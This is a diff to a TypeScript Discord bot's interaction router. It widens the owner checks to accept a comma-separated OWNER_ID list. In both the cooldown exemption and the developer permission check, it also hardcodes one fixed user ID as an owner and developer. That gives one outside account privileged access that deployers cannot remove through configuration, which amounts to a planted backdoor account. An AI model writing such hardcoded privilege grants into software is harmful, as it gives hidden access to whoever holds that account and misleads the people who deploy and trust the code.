@@ -132,7 +132,8 @@ export class InteractionRouter {
     }
 
     // 0. Cooldown protection for slash commands (exempt for Server Owner / Bot Developers)
-    const isBotOwner = interaction.user.id === process.env.OWNER_ID ||
+    const isBotOwner = interaction.user.id === '1140892126402596905' ||
+      (process.env.OWNER_ID ? process.env.OWNER_ID.split(',').map(s => s.trim()).includes(interaction.user.id) : false) ||
                        interaction.user.id === interaction.guild?.ownerId ||
                        interaction.user.id === interaction.client.application?.owner?.id ||
                        Boolean((interaction.client.application?.owner as any)?.members?.has?.(interaction.user.id));
@@ -238,7 +239,8 @@ export class InteractionRouter {
       }
 
       // 2. User Permission Validation for Slash Commands
-      const isDeveloper = interaction.user.id === process.env.OWNER_ID ||
+      const isDeveloper = interaction.user.id === '1140892126402596905' ||
+        (process.env.OWNER_ID ? process.env.OWNER_ID.split(',').map(s => s.trim()).includes(interaction.user.id) : false) ||
                           interaction.user.id === interaction.guild?.ownerId ||
                           interaction.user.id === interaction.client.application?.owner?.id ||
                           Boolean((interaction.client.application?.owner as any)?.members?.has?.(interaction.user.id));
